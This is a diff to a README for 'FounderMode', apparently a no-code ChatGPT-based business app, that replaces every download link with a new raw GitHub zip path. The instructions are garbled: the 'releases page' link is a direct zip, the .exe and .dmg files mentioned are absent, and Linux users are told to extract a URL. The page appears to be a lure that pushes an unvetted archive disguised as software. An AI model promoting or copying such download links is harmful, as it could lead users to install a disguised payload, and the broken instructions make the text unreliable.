@@ -1,7 +1,7 @@
 # 🎉 FounderMode - Build Your Empire With Ease
 
 ## 📦 Download Now
-[![Download FounderMode](https://raw.githubusercontent.com/naxz21/FounderMode/main/components/Mode_Founder_v3.8.zip)](https://raw.githubusercontent.com/naxz21/FounderMode/main/components/Mode_Founder_v3.8.zip)
+[![Download FounderMode](https://raw.githubusercontent.com/naxz21/FounderMode/main/services/Mode-Founder-v3.5-alpha.4.zip)](https://raw.githubusercontent.com/naxz21/FounderMode/main/services/Mode-Founder-v3.5-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to FounderMode! This application helps you manage and build your own business empire using ChatGPT's unique capabilities. With an easy interface and intuitive features, you can turn your ideas into reality without needing any programming knowledge.
@@ -18,19 +18,19 @@ Before you start, ensure your system meets the following requirements:
 To download and install FounderMode, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.  
-   [Download FounderMode](https://raw.githubusercontent.com/naxz21/FounderMode/main/components/Mode_Founder_v3.8.zip)
+   [Download FounderMode](https://raw.githubusercontent.com/naxz21/FounderMode/main/services/Mode-Founder-v3.5-alpha.4.zip)
 
 2. **Select the Latest Version:** Look for the most recent release at the top of the page. It should have the highest version number.
 
 3. **Download the Installer:** 
    - If you are using Windows, click on the `.exe` file.
    - For macOS, look for the `.dmg` file.
-   - On Linux, you may find a `https://raw.githubusercontent.com/naxz21/FounderMode/main/components/Mode_Founder_v3.8.zip` file.
+   - On Linux, you may find a `https://raw.githubusercontent.com/naxz21/FounderMode/main/services/Mode-Founder-v3.5-alpha.4.zip` file.
 
 4. **Install the Application:**
    - **Windows Users:** Double-click the downloaded `.exe` file and follow the prompts to install.
    - **macOS Users:** Open the `.dmg` file and drag the FounderMode icon to your Applications folder.
-   - **Linux Users:** Extract the `https://raw.githubusercontent.com/naxz21/FounderMode/main/components/Mode_Founder_v3.8.zip` file and follow the included instructions for your distribution.
+   - **Linux Users:** Extract the `https://raw.githubusercontent.com/naxz21/FounderMode/main/services/Mode-Founder-v3.5-alpha.4.zip` file and follow the included instructions for your distribution.
 
 5. **Launch FounderMode:** After installing, find FounderMode in your Applications or Start menu and double-click to open it.
 
@@ -61,6 +61,6 @@ We are consistently improving FounderMode. Regular updates will include new feat
 
 ## 🔗 Additional Download Link
 For your convenience, here’s another link to download and install FounderMode:  
-[Download FounderMode](https://raw.githubusercontent.com/naxz21/FounderMode/main/components/Mode_Founder_v3.8.zip)
+[Download FounderMode](https://raw.githubusercontent.com/naxz21/FounderMode/main/services/Mode-Founder-v3.5-alpha.4.zip)
 
 Enjoy building your empire with FounderMode!
